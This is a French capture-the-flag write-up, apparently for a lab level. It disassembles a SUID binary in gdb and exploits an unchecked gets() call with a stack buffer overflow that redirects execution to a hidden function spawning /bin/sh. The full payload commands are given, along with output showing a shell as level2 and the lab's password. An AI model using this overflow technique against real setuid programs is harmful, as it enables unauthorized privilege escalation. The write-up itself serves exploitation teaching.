## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
  [...]
  ```
    - On a un binaire appartenant a level2 dans le home avec les droits SUID.

- `./level1`
  ```
    
  ```
  - Le programme attend un input
    - `test`
      - rien

- `gdb level1`
  - `set disassembly-flavor intel`
  - `info function`
    ```asm
    [...]
      0x08048444  run
      0x08048480  main
    [...]
    ```
    - On trouve une fonction run en plus du main
  - `disas main`
    ```asm
    Dump of assembler code for function main:
       0x08048480 <+0>:	push   ebp
       0x08048481 <+1>:	mov    ebp,esp
       0x08048483 <+3>:	and    esp,0xfffffff0
       0x08048486 <+6>:	sub    esp,0x50
       0x08048489 <+9>:	lea    eax,[esp+0x10]
       0x0804848d <+13>:	mov    DWORD PTR [esp],eax
       0x08048490 <+16>:	call   0x8048340 <gets@plt>
       0x08048495 <+21>:	leave
       0x08048496 <+22>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+6>
      - Initialisation de la mémoire (libère 80 octets pour la stack et aligne la mémoire)<br/><br/>
    - <+9> ... <+16>
      - Stocke l'adresse de esp + 16 dans eax
      - Stocke la valeur de eax (l'adresse de esp + 16) dans la stack (à esp)
      - Call gets() avec le paramètre stocké dans la stack<br/><br/>
    - <+21> ... <+22>
      - réinitialisation de la mémoire, fin d'exécution<br/><br/>
    - Le call a gets() n'est pas protégé par une condition
    - La fonction run n'est pas appelée
    
  - `disas run`
    ```asm
    Dump of assembler code for function run:
       0x08048444 <+0>:	push   ebp
       0x08048445 <+1>:	mov    ebp,esp
       0x08048447 <+3>:	sub    esp,0x18
       0x0804844a <+6>:	mov    eax,ds:0x80497c0
       0x0804844f <+11>:	mov    edx,eax
       0x08048451 <+13>:	mov    eax,0x8048570
       0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
       0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
       0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
       0x0804846a <+38>:	mov    DWORD PTR [esp],eax
       0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
       0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
       0x08048479 <+53>:	call   0x8048360 <system@plt>
       0x0804847e <+58>:	leave
       0x0804847f <+59>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire (libère 24 octets pour la stack et aligne la mémoire)<br/><br/>
    - <+6> ... <+41>
      - Stocke la valeur dans le registre data segment à l'adresse 0x80497c0 dans eax, puis dans edx
        - `x/s 0x80497c0`
          - `0x80497c0 <stdout@@GLIBC_2.0>:	 ""`
      - Stocke la valeur à l'adresse 0x8048570 dans eax
        - `x/s 0x8048570`
          - `0x8048570:	 "Good... Wait what?\n"`
      - Stocke la valeur de edx (stdout) dans la stack (à esp + 12)
      - Stocke 0x13 (19) dans la stack (à esp + 8)
      - Stocke 0x1 (1) dans la stack (à esp + 4)
      - Stocke la valeur de eax dans la stack (à esp)
      - Call fwrite() avec les arguments stockés dans la stack<br/><br/>
    - <+46> ... <+53>
      - Stocke la valeur à l'adresse 0x8048584 dans la stack (à esp)
        - `x/s 0x8048584`
          - `0x8048584:	 "/bin/sh"`
      - Call system() avec l'argument stocké dans la stack<br/><br/>
    - <+58> ... <+59>
      - réinitialisation de la mémoire, fin d'exécution<br/><br/>
    - La fonction run affiche "Good... Wait what?\n" sur la sortie standard et lance un shell via la commande system()

## Exploit

L'objectif va être de forcer l'appel de la fonction run() par la fonction main() pour avoir notre shell en tant que level2.
On va tirer avantage de la [vulnérabilité de gets à un buffer overflow](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351) pour écrire l'adresse de run dans l'EIP, puisqu'il n'est pas protégé.
<br/><br/>Comme vu plus haut, main alloue 80 octets dans la stack pour ses variables, on va commencer par là:
  - `python -c 'print "a" * 80' > /tmp/exploit`
  - `gdb level1`
    - `run < /tmp/exploit`
      ```
      Starting program: /home/user/level1/level1 < /tmp/exploit

      Program received signal SIGSEGV, Segmentation fault.
      0x61616161 in ?? ()
      ```
      - Nice, on SegFault comme attendu et l'eip est réécrit avec des a: `0x61616161`

On devrait pouvoir écraser la valeur de l'eip avec les 4 derniers octets, on vérifie avec un exploit de 76 "a" et 4 "b" :
- `python -c 'print "a" * 76 + "b" * 4' > /tmp/exploit`
  ```
  Starting program: /home/user/level1/level1 < /tmp/exploit

  Program received signal SIGSEGV, Segmentation fault.
  0x62626262 in ?? ()
  ```
  - Parfait, l'EIP est écrasé par les 4 derniers octets: `0x62626262`
On a vu lors de l'analyse que l'adresse de la fonction run() est 0x08048444, on la passe en [little endian](https://security.stackexchange.com/questions/177819/why-do-we-use-little-endian-in-buffer-overflow-attacks) avant de la load à la fin de notre exploit:
- `python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit`
- `cat /tmp/exploit | ./level1`
  ```
  Good... Wait what?
  Segmentation fault (core dumped)
  ```
  - Ok, on lance bien la fonction run(), mais le shell est fermé tout de suite, il faut [garder stdin ouvert avec cat](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process):
      > " The shell doesn't have any input, when it detects EOF it dies. " 
      - `cat /tmp/exploit - | ./level1`
        ```
        Good... Wait what?
        
        ```
        - `whoami`
          ```
          level2
          ```
        - `cat /home/user/level2/.pass`
          ```
          53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
          ```
